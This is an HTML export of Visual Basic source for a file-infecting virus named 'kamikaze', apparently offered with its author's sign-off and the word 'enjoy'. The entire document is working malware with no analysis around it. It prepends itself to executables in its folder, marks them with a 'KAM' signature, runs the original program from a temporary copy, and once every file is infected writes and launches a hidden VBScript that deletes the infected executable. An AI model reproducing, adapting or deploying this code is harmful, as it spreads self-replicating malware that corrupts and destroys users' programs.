<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'\\\kamikaze\\\
</span><span class="sc0">
</span><span class="sc1">'infects exe files in current directory.. one infection per cycle..
</span><span class="sc0">
</span><span class="sc1">'when all exe files in current directory are infected, every executed infected file
'will be deleted by a spawned vbscript..
</span><span class="sc0">
</span><span class="sc1">'enjoy
</span><span class="sc0">
</span><span class="sc1">'alcopaul
</span><span class="sc0">

</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Module1"</span><span class="sc0">
</span><span class="sc3">Option</span><span class="sc0"> </span><span class="sc3">Explicit</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwDesiredAccess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bInheritHandle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpExitCode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hObject</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">iResult</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">hProg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">idProg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">STILL_ACTIVE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H103</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1F0FFF</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Main</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">aa</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">arr1</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lenhost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">vc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">hdlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">hostlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">virlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">buffhdlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">buffhostlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">buffvirlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">vdir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir$</span><span class="sc6">(</span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"*.exe"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc0">
</span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir$</span><span class="sc0">
</span><span class="sc3">Wend</span><span class="sc0">
</span><span class="sc7">arr1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">a</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">arr1</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">aa</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Set fso = CreateObject("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"scripting.filesystemobject"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Do While fso.fileexists("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">") = True"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"fso.deletefile "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">", True"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Loop"</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"kamikaze.vbs"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">aa</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc4">"wscript.exe "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"kamikaze.vbs"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHide</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">lenhost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">vc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">lenhost</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vc</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">vc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"KAM"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">notinfected</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">gggoop</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">notinfected</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc7">virustime</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0">
</span><span class="sc7">gggoop</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">buffhostlen</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">6144</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">buffvirlen</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">6144</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buffvirlen</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buffhostlen</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"kam.exe"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc0">
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buffhostlen</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc0">
</span><span class="sc1">'borrowed from murkry's vb5 virus
</span><span class="sc7">idProg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Shell</span><span class="sc6">(</span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"kam.exe "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Command</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">hProg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">idProg</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc7">hProg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">STILL_ACTIVE</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc7">hProg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc7">vdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"kam.exe"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">virustime</span><span class="sc6">(</span><span class="sc7">hostpath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ffile</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">hostcode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">vir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">vircode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">header</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">a1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">vir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">vir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">vir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">hostpath</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">hostcode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostcode</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#2</span><span class="sc0">
</span><span class="sc7">vircode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">6144</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">lost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">6144</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vircode</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lost</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#2</span><span class="sc0">
</span><span class="sc7">a1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"KAM"</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">hostpath</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc0">
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vircode</span><span class="sc0">
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostcode</span><span class="sc0">
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">a1</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span></div></body>
</html>
